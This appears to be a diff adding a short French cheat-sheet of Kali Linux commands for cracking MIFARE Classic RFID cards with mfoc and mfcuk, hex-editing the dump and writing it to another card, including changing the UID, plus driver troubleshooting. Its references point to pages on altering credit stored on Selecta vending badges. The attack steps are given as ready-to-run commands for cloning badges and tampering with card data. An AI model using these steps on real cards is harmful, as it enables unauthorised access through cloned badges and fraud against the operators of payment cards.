@@ -1,0 +1,49 @@
+SOUS KALI:
+
+COPIE: 
+	mfoc -P 500 -f clé.txt -O badge.dmp
+        sudo mfcuk -C -R 0 -s 250 -S 250 -v 3 -o cardtocopy.dmp
+	sudo mfcuk -C -R 0:A -v 2 -s 250 -S 250 -O copie.dmp
+EDITER le dump: 
+	sudo hexedit badge.dmp  (puis enregistrer avec CTRL+X)
+
+TRANSFERER le dump: 
+	nfc-mfclassic w B daltys-40257.dmp daltys-40257.dmp
+	nfc-mfclassic w A newdonnée.dmp anciennce-donnée.dmp
+	nfc-mfclassic W A carte-à-copier.dmp (pour changer aussi l'UID) 
+
+
+EN CAS DE PROBLEMES:
+
+Mise à jour paquet: sudo apt-get update
+Installer le driver: sudo apt install libacsccid1 libccid pcscd  libnfc* rfdump libifd-cyberjack6
+Installer libusb etc: sudo apt-get install libusb-dev libccid pcscd libpcsclite1 libpcsclite-dev
+Installer editeur hexa: sudo apt-get install hexedit 
+
+
+/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\
+Si vous avez cette erreur:
+		Unable to claim USB interface (Device or resource busy)
+		nfc-list: ERROR: Unable to open NFC device: acr122_usb:001:020
+
+Tapez: sudo nano /etc/modprobe.d/blacklist-libnfc.conf
+
+Puis entrez ces deux lignes: blacklist pn533
+			     blacklist nfc
+Enregistrez puis tapez: 
+		sudo modprobe -r pn533 nfc
+
+Ensuite: 
+		sudo service pcscd restart 
+/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\/!\
+
+
+REFERENCES:
+
+https://dyrk.org/2015/09/03/faille-nfc-distributeur-selecta/
+https://geekz0ne.fr/wiki/doku.php?id=modifier_informations_badges_selecta
+https://learn.adafruit.com/adafruit-pn532-rfid-nfc/mifare
+https://olivierlemoal.fr/blog//nfc/mifare/2014/04/28/nfc-3.html
+https://linuskarlsson.se/blog/acr122u-mfcuk-and-mfoc-cracking-mifare-classic-on-arch-linux/
+https://www.latelierdugeek.fr/2015/07/17/dupliquer-contenu-puce-rfid-mifare-classic/
+https://xorhak.org/manage-d8-selecta-credit-on-your-rfid-card/
